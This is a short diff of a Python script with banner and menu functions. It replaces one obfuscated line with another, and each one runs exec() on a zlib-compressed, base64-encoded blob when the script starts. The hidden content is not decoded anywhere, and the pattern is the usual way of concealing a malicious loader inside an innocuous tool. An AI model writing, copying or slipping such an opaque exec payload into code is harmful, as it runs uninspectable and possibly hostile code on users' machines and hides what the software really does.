@@ -47,4 +47,4 @@ def menu():
 
 banner()
 menu()
-exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UMFKxDAQPTdf0VsSjEO71AUXK4h4EBHB9SYibTKuoWkSkqxWxX93QxYvM7w3b2bejJ69C6mOTk6YxLfRoxiHiOtOxBT2MomkZyRvLtRLrW0dBrtD1jZ8Q6oUvg6xin1phpLYShzx9uH67nX79Hhzdc+zDqSzFmVijDaQpIfBg90FN4F2VLRduzrnWTgGHCZS4SLRp7whW4BoED0748T0xRnsrR/kxOjlLRURAsoP1nH+3LwQ1R+x4eTzXRusDVqm+IU5jFMn/9XTQnOCC0qWjweF0s0+YIys/AHGdZdJhVkpfmikm/jLyR+GR2LO')[0])))
+exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UMFKxDAQPTdfkVsSjEOr3T0sVhDxICKC601E2nRcQ9MkJFmtiv/uhixeZnhv3sy8GT17FxKNTk2Y5LfRgxz6iOtWxhT2KsmkZyRvLtCFaktDb3fIm1psSJXC1yFWsSvNUBI/k0e8fbi+e90+Pd5c3YusA+WsRZU4ZzUk5aH3YHfBTaAdk835qm1EFg4B+4lUuCj0KW/IFiAaRM9XgpiuOIO99b2aOLu8ZTJCQPXBWyGe6xcydkdsBPl81wapQctHcWEO48aT/+ppoQXBBRXPx8OIys0+YIy8/AGGdZvJEbNS/rDINvFXkD+ESmLL')[0])))
